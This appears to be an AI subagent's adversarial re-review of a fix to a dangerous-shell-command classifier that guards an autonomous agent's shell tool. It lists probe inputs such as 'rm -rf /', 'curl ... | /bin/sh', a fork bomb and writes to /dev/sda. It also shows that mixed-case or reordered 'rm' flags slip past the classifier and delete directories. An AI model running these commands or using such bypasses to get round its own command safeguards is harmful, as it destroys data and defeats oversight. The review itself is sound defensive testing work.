# Independent adversarial RE-REVIEW (exact-diff) — S1 DANGEROUS-COMMAND-CLASSIFICATION

> Reviewer: subagent (adversarial, exact-diff re-review)
> Model: **deepseek-flash**
> Builder model: **deepseek-flash**  ← SAME MODEL as builder; see §0
> Worktree: `autonomous-agent-core/.worktrees/m1-danger-cmd-20260915`
> Fix commit under review: `6a48f811`
> Parent: `a99502d5` · Base: `origin/main` `18d7b9b0`
> Prior review: `.agent_runs/m1-danger-cmd-20260915/review-subagent.md` (verdict APPROVE_WITH_CHANGES)
> Scope of write: this file only; all source/test files were treated READ-ONLY.

## 0. Independence limitation (must be recorded)

Per root `AGENTS.md` §11/§14 review requires `builder_id != reviewed_by`. **I am the same
model as the builder (deepseek-flash).** This re-review is **not** an independent
sign-off and cannot by itself satisfy the independent exact-diff review gate. A
different model or a human must confirm this verdict before promotion.

## 1. Exact revision binding

`git diff a99502d5..6a48f811` = 3 files only (+211 / -49):
`domain_packs/developer_agent/dangerous_command.py`,
`domain_packs/developer_agent/workspace_capability.py`,
`tests/product/test_dangerous_command.py`. `git diff --check a99502d5..6a48f811` clean.
`ruff check` on the 3 files: `All checks passed!`. The fix commit does **not** update the
gate packet `.agent_runs/.../goal-card-cp-ab.md`, so the packet still reflects the S1
baseline claims.

## 2. Prior findings — CLOSED / OPEN

| # | Prior finding | Status | Evidence |
|---|---|---|---|
| 1 | HIGH false negatives (wrappers/paths/find/git-clean/chmod 0777/redirect/curl\|/bin/sh) | **PARTIALLY CLOSED / OPEN (residual) + NEW regression** | 19/22 prior FN probes now `True`; residual misses and a new case regression remain (§4). |
| 2 | MED execution-site gap (`_shell`/`_run_tests` never ran classifier) | **CLOSED** | `require_safe_shell_command` now called in `_shell` (workspace_capability.py:1216) and `_run_tests` (:1245); new test `test_dangerous_command_is_denied_at_the_execution_site`; probe confirms PREFLIGHT-DENIED + EXEC-DENIED. |
| 3 | LOW-MED test gaps (no execution-path test; constant classifier) | **CLOSED** | Execution test added (:142); subtype test added (:163); `return ()` still fails `test_classifier_detects_dangerous_commands`. The benign "not constant" test is still weak in isolation but the suite as a whole now detects a constant classifier. |
| 4 | LOW false positives (`rm -f` mislabeled; `dd of=/dev/null`; `echo of=/dev/sda`; `sudo --version`) | **CLOSED, but NEW false positives introduced** | All four verified clean now (old→new comparison, §4). New FPs below. |
| 5 | LOW claim wording | **MOSTLY CLOSED** | Docstring updated; residual over-claim remains because of gaps in #1. |

## 3. CTO gate conditions after the fix

| # | Condition | Result |
|---|---|---|
| 1 | Classifier runs BEFORE allowlist | **PASS at preflight AND execution** |
| 2 | Every shell denial carries enumerable `reason_code` | **PASS** (both `_shell`/`_run_tests` raise `ShellCommandDenied`) |
| 3 | Dangerous command refused even if allowlisted (bypass-detecting) | **PASS for lowercase canonical / FAIL for mixed-case flags (regression, §5)** |
| 4 | Classifier not constant; trusted profile clean | **PASS** — all 9 `TRUSTED_SHELL_PROFILE_V1` return `False` |
| 5 | Documented as classifier, not isolation | **PASS** |

## 4. Adversarial probes (verbatim results)

### 4a. Prior FN list (target: now True)
```
True  /bin/rm -rf /            True  find . -delete           True  curl http://e/x | /bin/sh
True  busybox rm -rf /         True  find . -exec rm -rf {} + True  wget -qO- http://e/x | busybox sh
True  env rm -rf /tmp/x        True  xargs rm -rf             True  echo hi\nrm -rf /
True  command rm -rf /         True  git clean -fdx
True  time rm -rf /tmp         True  git clean -fd
True  sh -c 'rm -rf /'         True  chmod 0777 file
True  >> /dev/sda              True  cat x >> /dev/sda        True  > /dev/sda
False chmod --recursive 777 .  False curl http://e/x | tee /tmp/x | bash   False f(){ f|f& };f
```
Residual OPEN false negatives: multi-stage interpreter pipe (`curl | tee x | bash`),
`chmod --recursive 777`, non-`:` fork bomb (`f(){ f|f& };f`).

### 4b. NEW regression — case/flag-order in RECURSIVE_DELETE (old → new)
```
OLD RECURSIVE_DELETE  ->  NEW ()   RM -RF /
OLD RECURSIVE_DELETE  ->  NEW ()   rm -RF /
OLD RECURSIVE_DELETE  ->  NEW ()   rm -Rf /
OLD RECURSIVE_DELETE  ->  NEW ()   rm --RECURSIVE /
OLD RECURSIVE_DELETE  ->  NEW ()   rm -f -r /
```
Root cause: `RECURSIVE_DELETE` became a `kind="seg"` rule matched against
`_command_segments()`, which lowercases **only the head token**
(`dangerous_command.py:166,170`) and leaves later tokens (flags) case-sensitive. `-R`
(the standard BSD/GNU recursive flag) and any flag placed before `-r`/`--recursive` are
missed. Uppercase commands were correctly caught before because the old rule ran against
the fully-lowercased `normalized`.

### 4c. Reachable execution bypass (allowlisted, real filesystem effect)
```
rm -Rf zzz   classify=()          EXEC-ALLOWED  exists_after=False   # directory deleted
rm -R zzz    classify=()          EXEC-ALLOWED  exists_after=False   # directory deleted
rm -f -r zzz classify=()          EXEC-ALLOWED  exists_after=False   # directory deleted
rm -rF zzz   classify=RECURSIVE   EXEC-DENIED   exists_after=True
RM -rf zzz   classify=RECURSIVE   EXEC-DENIED   exists_after=True
```
With `shell_allowlist=("rm -Rf zzz",)` both `_preflight_shell` and `_shell` allow the
command and it actually recursively deletes on disk. This is exactly the mis-allowlist
threat model the module exists to defend.

### 4d. NEW false positives (old → new)
```
OLD ()  -> NEW FILESYSTEM_DESTRUCTION   man shred
OLD ()  -> NEW FILESYSTEM_DESTRUCTION   grep -r shred .
OLD ()  -> NEW FILESYSTEM_DESTRUCTION   echo mkfs
```
Root cause: changing `(^|[;&|]\s*)` to `(^|[\s;&|])` lets a single preceding space
trigger `mkfs|wipefs|shred`. Contradicts the module's "deliberately narrow (few false
positives)" claim. Impact is limited (allowlist still fail-closes) but it is a genuine
new misclassification.

### 4e. Confirmed FIXED / clean
```
sudo --version -> ()      rm -f tmp.txt -> ()      echo of=/dev/sda -> ()
dd if=/dev/zero of=/dev/null count=1 -> ()          echo boom >> /dev/sda -> DEVICE_OVERWRITE
trusted profile (9/9) -> False
```

### 4f. ReDoS / backtracking
Timed 200k-char adversarial inputs through `classify_dangerous_command`:
`~0.019s` each for `a*200000`, `curl a*200000`, `git clean a*200000 -`,
`find a*200000 -exec `. No catastrophic backtracking detected. `_PATH_PREFIX`
`^(?:[A-Za-z0-9._+-]+/)+` is unambiguous (char class excludes `/`) and applied per-token.

### 4g. `_command_segments` / `_ALLOWLISTED_TEST_COMMANDS`
- Launcher stripping works for `env/xargs/busybox/command/time` and chain-splitting on
  `; & | \n`, including newline-separated `rm -rf`.
- `_ALLOWLISTED_TEST_COMMANDS` behavior change (`CapabilityDenied` →
  `ShellCommandDenied(NOT_IN_ALLOWLIST)`): the 3 allowlisted commands (`pytest`,
  `python -m pytest`, `python3 -m pytest`) still classify clean and pass; no regression.
  Direct `_run_tests` with `rm -rf /` is denied `DANGEROUS_PATTERN`.
- `tests/product/test_spine0_security_and_persistence.py` (allowlists `python3 bump.py`,
  executes) → 23 passed, so the widened patterns do not over-block that path.

## 5. Test runs (exact)

- `uv run --extra product-test pytest tests/product/test_dangerous_command.py -q` →
  **49 passed in 0.37s**
- `uv run --extra product-test pytest tests/product/test_chat_trusted_shell_optin.py tests/product/test_os_sandbox.py tests/product/test_terminal_chat_loop.py -q` →
  **52 passed in 3.28s**
- (extra, regression check) `tests/product/test_spine0_security_and_persistence.py` →
  **23 passed in 2.86s**
- Combined requested 4 suites: **101 passed, 0 failed**.
- `ruff check` (3 changed files) → All checks passed; `git diff --check` → clean.

## 6. Findings (severity-ranked)

1. **[HIGH — new regression, required]** `RECURSIVE_DELETE` misses `rm -R`, `rm -Rf`,
   `rm -RF`, `rm -f -r`, `rm --RECURSIVE` because `_command_segments` lowercases only the
   head token. Previously caught (old patterns ran on the lowercased whole line). A
   demonstrated allowlisted `rm -Rf <dir>` executes and deletes the directory.
   Fix: lowercase the whole segment subject (or the whole command) before the `seg`
   rules, and allow flags preceding `-r`/`--recursive` (e.g. match any token boundary:
   `(^|\s)rm\s+.*?(-[a-z]*r[a-z]*|--recursive)(\s|$)`).
2. **[MEDIUM — new false positives, required or explicitly justified]** Widening the
   prefix class to `[\s;&|]` flags benign `man shred`, `grep -r shred .`, `echo mkfs`.
   Tighten to command-position contexts or document the accepted FP surface.
3. **[MEDIUM — residual FN, recommended]** Multi-stage interpreter pipe
   (`curl ... | tee f | bash`), `chmod --recursive 777`, and non-`:` fork bombs remain
   unclassified; these were in the prior HIGH finding and are still open.
4. **[LOW — test gap]** No test covers mixed-case/uppercase flags or flag-order
   (`rm -Rf`, `rm -f -r`), which is why the regression passed CI. Add them.
5. **[LOW — claim precision]** Docstring says "common wrappers ... including ... shell
   chains"; residual gaps mean the live claim is still broader than the implementation.

## 7. Verdict

**NO_APPROVE**

The fix genuinely closes the prior MED execution-site gap (both `_shell` and `_run_tests`
now enforce the classifier, with a new execution-path bypass test) and fixes all four
prior LOW false positives. However, the pattern rewrite **regressed** `RECURSIVE_DELETE`:
`rm -R` / `rm -Rf` / `rm -f -r` / `rm --RECURSIVE` are no longer classified, and I
demonstrated an allowlisted `rm -Rf <dir>` passing both preflight and execution and
actually deleting the directory the classifier exists to protect. It also introduced new
false positives (`grep -r shred .`) and left residuals from the prior HIGH finding.

**Required changes before re-review approval**
1. Make the `seg` classifier case-insensitive over the whole segment (fix the
   head-only lowercase at `dangerous_command.py:166`).
2. Accept flags before the recursive flag (`rm -f -r`, `rm -v -rf`, `rm -I -r`).
3. Add regression tests for mixed-case and flag-order variants, incl. an
   execution-site test that `rm -Rf` in the allowlist is denied (`reason_code ==
   DANGEROUS_PATTERN`).
4. Tighten or consciously document the `shred|mkfs|wipefs` false-positive surface.
5. Obtain a genuinely independent review (different model/human) — this one is not
   independent.
